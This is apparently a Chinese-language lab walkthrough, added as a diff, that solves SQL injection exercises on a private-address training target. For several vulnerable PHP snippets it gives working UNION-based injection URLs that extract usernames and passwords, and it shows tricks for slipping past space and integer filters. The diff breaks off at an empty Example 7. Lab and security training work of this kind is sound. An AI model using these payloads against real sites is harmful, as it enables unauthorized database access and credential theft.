@@ -1,0 +1,190 @@
+# SQL INJECTION SOLUTION
+
+## 有些知识要知道
+```sh
+--	:	MySQL Linux Style
+--+	:	MySQL Windows Style
+#	:	Hash (URL encode while use)
+--+-	:	SQL Comment
+;%00	:	Null Byte
+`	:	Backtick
+```
+
+- union 
+
+- limit  
+
+- concat: concat(username,0x3a,password)
+
+- : `select group_concat(username,0x3a,password,0x0a)from (select username,password from users limit 0,100)`; ( group_concat的连接字段长度限制为1024个字符)
+
+- 您可以使用CAST来增加缓冲区: `SELECT CAST(GROUP_CONCAT(username,0x3a,password,0x0a) AS CHAR(2048)) FROM users;`
+
+- 一些变量/函数可以被利用
+```sh
+Variable/Function		Output
+@@hostname	:	当前主机名
+@@tmpdir	:	临时目录
+@@datadir	:	数据存放目录
+@@version	:	数据库版本
+@@basedir	:	安装目录
+user()	:	当前用户
+database()	:	当前数据库
+version()	:	版本
+schema()	:	当前数据库
+UUID()	:	System UUID key
+current_user()	:	当前用户
+current_user	:	当前用户
+system_user()	:	当前系统用户
+session_user()	:	当前连接数据库的Session会话用户
+@@GLOBAL.have_symlink	:	Check if Symlink Enabled or Disabled
+@@GLOBAL.have_ssl	:	Check if it have ssl or not
+```
+```sh
+查询 : Select table_name from information_schema.talbes where table_schema='databasename'
+
+查询当前数据库: Select table_name from information_schema.tables where table_schema=database()
+
+注入 : http://fakesite.com/report.php?id=-23 union select 1,2,table_name,4,5 from information_schema.tables where table_schema=database()--+
+```
+
+
+
+
+## Example1
+-----------------------------------------------------------------------------
+
+Code review:
+```sh
+<?php
+.... ...
+$sql = "SELECT * FROM users where name='";
+$sql .= $_GET["name"]."'";   
+$result = mysql_query($sql);
+.... ...
+?>
+```
+
+- 输入查询 name=' or 1=1-- -
+- 注意`-- -`注释，如果后面没有空白，通常会导致问题
+
+- 检索列名称: `http://192.168.215.149/sqli/example1.php?name=root' union select 1,2,column_name,4,5 from information_schema.columns where table_schema=database() and table_name='tablename' or 1=1-- -`
+
+- 用LIMIT逐一检索提取的信息: `http://192.168.215.149/sqli/example1.php?name=root' union select 1,(select concat(name,0x3a,groupid,0x3a,passwd) from users limit 3,1),3,4,5 or 1=1-- -`
+
+- 检索一次: `http://192.168.215.149/sqli/example1.php?name=root' union select 1,(select group_concat(name,0x3a,0x3a,passwd) from users),3,4,5 or 1=1-- -`
+---------------------------------------------------------------------------------------
+
+## Example2
+--------------------------------------------------------------------------------------------
+
+代码审计:
+```sh
+<?php
+... ..
+if (preg_match('//',$_GET["name"])){
+	die("ERROR NO SPACE");
+}
+$sql="SELECT * From users  where name='";
+ $sql .= $_GET["name"]."'";
+
+  $result = mysql_query($sql);
+
+
+?>
+
+- 当带有空格的查询将报告错误
+
+- 但是，我们可以用/**/或TAB(%09, URL编码)相同的字符替换空白以绕过
+- 检索列号: `http://192.168.215.149/sqli/example2.php?name=root%27%09union%09select%091,2,3,4,5%09or%091=1--%09-`
+
+- 与示例1相同，但替换空白区域
+---------------------------------------------------------------------------------------------
+## Example3
+-----------------------------------------------------------------------------------
+
+code review:
+```sh
+<?php
+... ..
+\s  任意空白字符
+
+if (preg_match('/\s+/',$_GET["name"])){ 
+	die("ERROR NO SPACE");
+}
+$sql="SELECT * FROM users where name='";
+$sql .= $_GET["name"]."'";
+$result = mysql_query($sql);
+... ..
+?>
+```
+- 通过使用 [PCRE regex(|s+)](http://php.net/manual/en/regexp.reference.escape.php) 我们可以防止空白或TAB/HT字符。 但是我们可以使用/**/来代替
+
+- 与上面的两个例子相同
+
+---------------------------------------------------------------------------------
+
+## Example4
+
+code review:
+```sh
+<?php
+... ...
+$sql="SELECT * FROM users where id=";
+$sql.=mysql_real_escape_string($_GET["id"])." ";
+$result= mysql_query($sql);
+... ...
+?>
+```
+- [mysql_real_escape_string](http://php.net/manual/en/function.mysql-real-escape-string.php) 用于防止使用字符 `\x00, \n, \r, \, '," 和 \x1a`进行注入
+
+-然而，在这种情况下，'id'被用作一个不从`'`引用的整数，所以它仍然被sql注入攻击。
+
+- 检索表名: `http://192.168.215.149/sqli/example4.php?id=2 union select 1,table_name,3,4,5 from information_schema.tables where table_schema=database() limit 1,1--+`
+
+- 检索列名: `http://192.168.215.149/sqli/example4.php?id=2 union select 1,column_name,3,4,5 from information_schema.columns where table_schema=database() limit 0,6--+`
+
+- 检索密码: `http://192.168.215.149/sqli/example4.php?id=2 union select 1,concat(name,0x3a,passwd),3,4,5 from users limit 0,6--+`
+
+------------------------------------------------------------------------------------------------------------------
+
+## Example 5
+code review:
+```sh
+<?php
+    ... ...
+  if (!preg_match('/^[0-9]+/', $_GET["id"])) {
+      die("ERROR INTEGER REQUIRED");   
+  }
+  $sql = "SELECT * FROM users where id=";
+  $sql .= $_GET["id"] ;
+  
+  $result = mysql_query($sql);
+  ... ...
+?>
+```
+
+----------------------------------------------------------------------------------------------------------------------
+
+## Example 6
+code review:
+```sh
+<?php
+    ... ...
+  if (!preg_match('/[0-9]+$/', $_GET["id"])) {
+      die("ERROR INTEGER REQUIRED");   
+  }
+  $sql = "SELECT * FROM users where id=";
+  $sql .= $_GET["id"] ;
+
+  $result = mysql_query($sql);
+  ... ...
+?>
+```	 
+
+- 数据检索: `http://192.168.215.149/sqli/example6.php?id=2 union select 1,concat(name,0x3a,passwd),3,4,5 from users limit 0,6`
+
+---------------------------------------------------------------------------------------------------------------------------------------------------------------------------
+
+## Example 7
+
